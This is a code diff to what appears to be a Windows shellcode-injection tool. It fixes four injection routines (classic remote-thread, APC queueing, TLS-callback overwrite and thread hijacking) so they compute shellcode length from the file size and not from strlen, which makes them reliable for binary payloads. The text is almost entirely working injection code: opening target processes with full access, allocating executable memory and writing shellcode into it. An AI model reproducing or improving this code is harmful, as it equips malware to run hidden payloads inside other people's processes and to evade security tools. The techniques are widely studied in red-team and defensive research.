@@ -122,19 +122,24 @@ DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName) {
 		return -1;
 	}
 
+	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
+	if (!ShellCodeSize) {
+		return -1;
+	}
+
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 	if (!hProcess) {
 		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
 	}
 
-	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!ShelCodeAddress) {
 		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
 	}
 
-	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
@@ -163,19 +168,25 @@ DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
 		return -1;
 	}
 
+	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
+	if (!ShellCodeSize) {
+		return -1;
+	}
+
+
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 	if (!hProcess) {
 		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
 	}
 
-	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!ShelCodeAddress) {
 		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
 	}
 
-	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
@@ -264,7 +275,16 @@ DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* Executa
 	GetMainModuleInfo(ProcessInfo.PID, &ModuleInfo);*/
 
 	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
-	Status = ChangeTheTLSCallBackFunctionInRemoteProcess(ProcessInfo.PID, &ModuleInfo, ShellCode);
+	if (!ShellCode) {
+		return -1;
+	}
+
+	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
+	if (!ShellCodeSize) {
+		return -1;
+	}
+
+	Status = ChangeTheTLSCallBackFunctionInRemoteProcess(ProcessInfo.PID, &ModuleInfo, ShellCode, ShellCodeSize);
 	
 	CloseHandle(DebugEv.u.CreateProcessInfo.hFile);
 	Status = DebugActiveProcessStop(PID);
@@ -283,8 +303,14 @@ DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
 	DWORD Status = NULL;
 	LPVOID ShelCodeAddress = NULL;
 	DWORD BytesWritten;
+
 	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
 	if (!ShellCode) {
+		return -1;
+	}
+
+	DWORD ShellCodeSize = GetSizeOfFile(ShellCodeFileName);
+	if (!ShellCodeSize) {
 		return -1;
 	}
 
@@ -294,12 +320,12 @@ DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
 		return -1;
 	}
 
-	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!ShelCodeAddress) {
 		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
 	}
-	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
